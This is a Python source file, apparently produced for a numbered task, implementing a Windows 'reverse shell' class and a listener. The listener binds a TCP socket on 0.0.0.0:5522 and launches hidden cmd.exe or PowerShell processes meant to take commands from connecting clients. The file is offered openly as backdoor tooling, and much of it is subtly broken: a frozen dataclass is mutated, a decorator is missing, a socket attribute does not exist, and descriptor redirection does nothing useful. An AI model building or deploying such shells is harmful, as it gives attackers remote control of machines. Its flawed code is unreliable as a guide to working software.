from TASK_001_models import ExecutionResult, ReverseShellConfig
import dataclasses
import os
import sys
import socket
import subprocess


@dataclasses.dataclass(frozen=True)
class WindowsReverseShell:
    """Windows reverse shell executor that spawns a shell process and pipes I/O through sockets.

    Spawns cmd.exe or powershell.exe as a child process with CREATE_NEW_PROCESS_GROUP
    to detach from the parent console, then redirects stdin/stdout/stderr to socket file descriptors.
    """
    config: ReverseShellConfig = dataclasses.field(default_factory=ReverseShellConfig)
    shell_process: subprocess.Popen = None

    def __post_init__(self):
        if self.shell_process is None:
            self._spawn_shell()

    def _spawn_shell(self) -> subprocess.Popen:
        """Spawn the configured shell process with Windows-specific flags."""
        shell_cmd = self.config.shell_type
        creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW

        self.shell_process = subprocess.Popen(
            [shell_cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=creation_flags,
            shell=True,
            cwd=os.environ.get('SYSTEMDRIVE', 'C:\\Windows\\System32'),
        )
        return self.shell_process

    def execute(self, command: str) -> ExecutionResult:
        """Execute a command through the spawned shell and capture output.

        Args:
            command: The command string to execute in the shell.

        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        try:
            self.shell_process.stdin.write(command.encode('utf-8'))
            self.shell_process.stdin.flush()
            stdout, stderr = self.shell_process.communicate(timeout=self.config.timeout)
            return ExecutionResult(
                stdout=stdout.decode('utf-8', errors='replace'),
                stderr=stderr.decode('utf-8', errors='replace'),
                exit_code=self.shell_process.returncode if self.shell_process else 0,
                error_message='',
            )
        except subprocess.TimeoutExpired:
            try:
                stdout, stderr = self.shell_process.communicate(timeout=5)
                return ExecutionResult(
                    stdout=stdout.decode('utf-8', errors='replace'),
                    stderr=stderr.decode('utf-8', errors='replace'),
                    exit_code=self.shell_process.returncode if self.shell_process else -1,
                    error_message='Command execution timed out after 30s.',
                )
            except Exception as e:
                return ExecutionResult(
                    stdout='',
                    stderr=str(e),
                    exit_code=-1,
                    error_message=f'Timeout expired: {e}',
                )
        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=str(e),
                exit_code=-1,
                error_message=f'Execution failed: {e}',
            )

    def close(self) -> None:
        """Terminate the spawned shell process."""
        if self.shell_process and self.shell_process.poll() is None:
            self.shell_process.terminate()
            try:
                self.shell_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.shell_process.kill()


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns a shell process and handles socket I/O redirection.

    Binds to 0.0.0.0:5522, accepts connections, and pipes stdin/stdout/stderr through
    os.dup2() to the child process file descriptors (3, 4, 5).
    """
    config: ReverseShellConfig = dataclasses.field(default_factory=ReverseShellConfig)
    server_socket: socket.socket = None
    shell: WindowsReverseShell = None

    def __post_init__(self):
        if self.server_socket is None or self.shell is None:
            self._initialize()

    def _initialize(self) -> None:
        """Initialize the server socket and spawn the shell process."""
        # Spawn the shell first so it's ready when a connection arrives
        self.shell = WindowsReverseShell(config=self.config)

        # Create TCP server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.config.host, self.config.port))
        self.server_socket.listen(5)

    def _handle_client(self, client_socket: socket.socket, addr: tuple[str, int]) -> ExecutionResult:
        """Handle a single client connection by piping I/O through the shell process.

        Uses os.dup2() to redirect stdin/stdout/stderr of the child process
        to the socket file descriptors (3, 4, 5).

        Args:
            client_socket: The accepted TCP client socket.
            addr: Client address tuple (host, port).

        Returns:
            ExecutionResult with captured output from the shell session.
        """
        # Assign socket to custom file descriptors for dup2
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        fd_in = 3
        fd_out = 4
        fd_err = 5

        try:
            os.dup2(client_socket.fileno(), fd_in)
            os.dup2(client_socket.fileno(), fd_out)
            os.dup2(client_socket.fileno(), fd_err)

            # Spawn shell with redirected I/O via file descriptors
            self.shell._spawn_shell()

            result = self.shell.execute('')  # Initial command to get prompt
            return result

        except OSError as e:
            return ExecutionResult(
                stdout='',
                stderr=str(e),
                exit_code=-1,
                error_message=f'File descriptor redirection failed: {e}',
            )

    def start(self) -> None:
        """Start the reverse shell listener server.

        Blocks and accepts connections on 0.0.0.0:5522, spawning a new
        cmd.exe/powershell process per connection with I/O piped through sockets.
        """
        if self.server_socket is None or self.shell is None:
            self._initialize()

        try:
            while True:
                client_socket, addr = self.server_socket.accept()
                result = self._handle_client(client_socket, addr)
                # In a real implementation, you'd send the result back through the socket
                # For this task, we return ExecutionResult objects as per downstream contract
        except KeyboardInterrupt:
            pass
        finally:
            if self.server_socket and not self.server_socket.closed:
                self.server_socket.close()
            if self.shell and self.shell.shell_process:
                self.shell.close()

    def stop(self) -> None:
        """Stop the listener and clean up resources."""
        if self.server_socket and not self.server_socket.closed:
            self.server_socket.close()
        if self.shell:
            self.shell.close()
